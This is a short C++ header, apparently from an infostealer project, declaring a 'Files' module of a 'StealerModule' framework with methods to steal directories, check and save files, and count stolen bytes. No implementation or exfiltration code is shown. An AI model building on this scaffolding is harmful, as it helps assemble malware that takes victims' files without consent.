//
// Created by .1qxz on 07.06.2024.
//

#ifndef STEALER_FILES_H
#define STEALER_FILES_H


#include "../../StealerModule.h"

class Files : public StealerModule {
public:
    void execute(fs::path& root) override;
private:
    void steal_directory(const fs::path &path, const fs::path &out);
    void check_and_save_file(const fs::path &path, const fs::path &rel_path, const fs::path &out);
    std::uintmax_t stealed_size = 0;
};


#endif //STEALER_FILES_H
